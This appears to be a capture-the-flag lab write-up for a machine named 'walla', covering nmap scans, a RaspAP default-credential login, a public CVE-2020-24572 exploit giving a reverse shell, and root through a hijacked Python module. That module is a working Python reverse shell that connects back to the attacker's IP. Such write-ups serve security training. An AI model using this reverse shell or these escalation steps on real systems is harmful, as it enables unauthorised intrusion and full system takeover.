## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.229.97

# HOSTNAME
walla
# OPERATING SYSTEM
Debian GNU/Linux 10 (buster)                  // Found post initial foothold
# CREDENTIALS
- Default creds RaspAP                       // Found via google 
admin:Secret 
```
## OPEN PORTS DETAILS
```bash
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
23/tcp    open  telnet     syn-ack ttl 61 Linux telnetd
25/tcp    open  smtp       syn-ack ttl 61 Postfix smtpd
53/tcp    open  tcpwrapped syn-ack ttl 61
422/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8091/tcp  open  http       syn-ack ttl 61 lighttpd 1.4.53
42042/tcp open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```
# ENUMERATION
```bash
# HTTP
8091/tcp  open  http       syn-ack ttl 61 lighttpd 1.4.53
sudo curl -I $url
HTTP/1.1 401 Unauthorized                                                                     
Set-Cookie: PHPSESSID=09rjo60s3vbu1uhg23up6mgo48; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate       
Pragma: no-cache 
WWW-Authenticate: Basic realm="RaspAP"
Content-type: text/html; charset=UTF-8                                                        
Date: Tue, 19 Nov 2024 17:21:53 GMT
Server: lighttpd/1.4.53

- lighttpd/1.4.53
- RaspAP 
- http://192.168.229.97:8091/ requires username and password
- Checking RaspAP Default creds
- admin:secret - Works

- Exploit
https://github.com/gerbsec/CVE-2020-24572-POC

# SMTP
25/tcp    open  smtp       syn-ack ttl 61 Postfix smtpd

# SSH
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
422/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
42042/tcp open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

# TELNET
23/tcp    open  telnet     syn-ack ttl 61 Linux telnetd

# DNS
53/tcp    open  tcpwrapped syn-ack ttl 61
```
## INITIAL FOOTHOLD
```bash
- Exploit
https://github.com/gerbsec/CVE-2020-24572-POC
python3 exploit.py walla.pg 8091 192.168.45.212 8091 secret 2

sudo nc -nvlp 8091                                                                                                                                                                       
listening on [any] 8091 ...                                                                                                                                                                  
connect to [192.168.45.212] from (UNKNOWN) [192.168.229.97] 51174
bash: cannot set terminal process group (658): Inappropriate ioctl for device                                                                                                                bash: no job control in this shell  
www-data@walla:/var/www/html/includes$ id
id                                                                                                                                                                 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## PRIVILEGE ESCALATION
```bash
www-data@walla:/var/www/html/includes$ sudo -l                                                                                                                                              
sudo -l                                                                                                                                                            
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service

- /home/walter/ hash write permission as www-data
- file contents of /home/walter/wifi_reset.py
#!/usr/bin/python
import sys
try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()
wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")

- wificontroller not found
- we create a file wificontroller.py with python reverse shell
- wificontroller.py file contents
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.45.212",8091))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

# privesc
sudo nc -nvlp 8091
sudo /usr/bin/python /home/walter/wifi_reset.py
sudo nc -nvlp 8091                                        
[sudo] password for kali: 
listening on [any] 8091 ...
connect to [192.168.45.212] from (UNKNOWN) [192.168.229.97] 51180
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Nov 19 22:47:29 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.229.97
Nmap scan report for 192.168.229.97
Host is up, received reset ttl 61 (0.040s latency).
Scanned at 2024-11-19 22:47:31 IST for 67s
Not shown: 65444 closed tcp ports (reset), 84 filtered tcp ports (no-response)

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtTTLmNtp3zqxLNrL/geNhp8WLkauSPqJ7WY9404pchYQN7BUkpOeUGRNUAtrmwQ02tSIcXSIgaMkP9QYkcgpJ3LgukIrX8aICoFPX8n1PEgZhEryhHomgcWL99ER4uTm9+CXuG3plBp7fgNtacHGGG9tlIn9DqcWwRcsB0WuzZwOT8n0PEwggyMKmhA4LuKKn1933nCCgVFIJ1NLfr9fM+VA3ZwVB7IcPEMrXPRo9q3lZLJtB69biTSnNROXB1pf50LFUUOnuAQwBG+4Md5TK+zbuGuCtf6zB69b+th+XSiGAIO6USodt3DfTo6Vr9ZUEtQykoI2wVJ2ZkeTqzqD3
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTe9nM9KOPFzCX46nVw5gPZi8A4pUJ54B+rw0ehE0PlTNyoAuHTnFwZNLsSPI2yXIve0UqQgs4PYXqhht5nc9A=
|   256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO2CS9VQ1hSSMPudUXJYiFxw7cD92ImmSovNLtyyGSGu

23/tcp    open  telnet     syn-ack ttl 61 Linux telnetd

25/tcp    open  smtp       syn-ack ttl 61 Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Issuer: commonName=walla
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T18:26:36
| Not valid after:  2030-09-15T18:26:36
| MD5:   097c:bda1:76ab:9b73:c8ef:68ab:84e9:a055
| SHA-1: 6c4b:fee3:0bd6:d910:2ef9:f81a:3a41:72d8:31bd:baac
| -----BEGIN CERTIFICATE-----
| MIICzTCCAbWgAwIBAgIUSjsFHwJii76XBfqWrgTLj7nupXgwDQYJKoZIhvcNAQEL
| BQAwEDEOMAwGA1UEAwwFd2FsbGEwHhcNMjAwOTE3MTgyNjM2WhcNMzAwOTE1MTgy
| NjM2WjAQMQ4wDAYDVQQDDAV3YWxsYTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAOwqF+jjwFmrSmgMiDEP1C3Adi9w1nrHCw8pFunsf2BnG4tRF3Xj2blV
| d5+CaCqmsiADAjFGXNREudaCvYKvw9ctU83dKw8khjho9Q+vm6AEMgS78uQNhQp3
| uXFkQVboMxYZdtxGs2/JkE0S52qYXScSJWer8uEon7qAkLgRJ1gQQHlqZ44ekmdt
| wPaQIu5IYWIeMYiLHb3Ivvk6esj/01NpaNmTNyljF2LxdEJaRjYYEMPqvS2Z5Dzd
| QL+fIWkeINwvWl+J4rkZA5xnLnOo08BG4MtGHAi0b2+bJ4fGT4fnrgoXoG6D9vIN
| jcxFhgScgAiA+ifARtuoKjWMukDiChUCAwEAAaMfMB0wCQYDVR0TBAIwADAQBgNV
| HREECTAHggV3YWxsYTANBgkqhkiG9w0BAQsFAAOCAQEAmzn/Ujcmz5o+qRXzL2ZR
| 60yEhjRd3kRaU4im8917uvzt7tZ/ELIGbCEEaNfhNOvyqDAtRPZC7U1m94baUqr+
| 741Er3x+NPR8A0aNn4tYq6SnD66XNeVecQfplg6uTjVCChO1iEAFXo1ETUjP6WV6
| Am8XspbmjffTPLWei0uw+qXfOL9TFu8sIFbhr0+UmV6ZpXNc+yoqGUlKFUTcHye0
| OZHrz6yNf+hUnMWBY6wWUB5SlpT4Onrnm6SWBU7rAD3kvLAsmpQHI38x5NTAxRWZ
| m5NUiiBnSYTwXytEvzHdqgkNxKPQDKnfS8D9oeVFjtM22TNKI8ytVFV+SQ0plPA+
| tQ==
|_-----END CERTIFICATE-----

53/tcp    open  tcpwrapped syn-ack ttl 61

422/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtTTLmNtp3zqxLNrL/geNhp8WLkauSPqJ7WY9404pchYQN7BUkpOeUGRNUAtrmwQ02tSIcXSIgaMkP9QYkcgpJ3LgukIrX8aICoFPX8n1PEgZhEryhHomgcWL99ER4uTm9+CXuG3plBp7fgNtacHGGG9tlIn9DqcWwRcsB0WuzZwOT8n0PEwggyMKmhA4LuKKn1933nCCgVFIJ1NLfr9fM+VA3ZwVB7IcPEMrXPRo9q3lZLJtB69biTSnNROXB1pf50LFUUOnuAQwBG+4Md5TK+zbuGuCtf6zB69b+th+XSiGAIO6USodt3DfTo6Vr9ZUEtQykoI2wVJ2ZkeTqzqD3
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTe9nM9KOPFzCX46nVw5gPZi8A4pUJ54B+rw0ehE0PlTNyoAuHTnFwZNLsSPI2yXIve0UqQgs4PYXqhht5nc9A=
|   256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO2CS9VQ1hSSMPudUXJYiFxw7cD92ImmSovNLtyyGSGu

8091/tcp  open  http       syn-ack ttl 61 lighttpd 1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B5F9F8F2263315029AD7A81420E6CC2D
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

42042/tcp open  ssh        syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtTTLmNtp3zqxLNrL/geNhp8WLkauSPqJ7WY9404pchYQN7BUkpOeUGRNUAtrmwQ02tSIcXSIgaMkP9QYkcgpJ3LgukIrX8aICoFPX8n1PEgZhEryhHomgcWL99ER4uTm9+CXuG3plBp7fgNtacHGGG9tlIn9DqcWwRcsB0WuzZwOT8n0PEwggyMKmhA4LuKKn1933nCCgVFIJ1NLfr9fM+VA3ZwVB7IcPEMrXPRo9q3lZLJtB69biTSnNROXB1pf50LFUUOnuAQwBG+4Md5TK+zbuGuCtf6zB69b+th+XSiGAIO6USodt3DfTo6Vr9ZUEtQykoI2wVJ2ZkeTqzqD3
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTe9nM9KOPFzCX46nVw5gPZi8A4pUJ54B+rw0ehE0PlTNyoAuHTnFwZNLsSPI2yXIve0UqQgs4PYXqhht5nc9A=
|   256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO2CS9VQ1hSSMPudUXJYiFxw7cD92ImmSovNLtyyGSGu
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

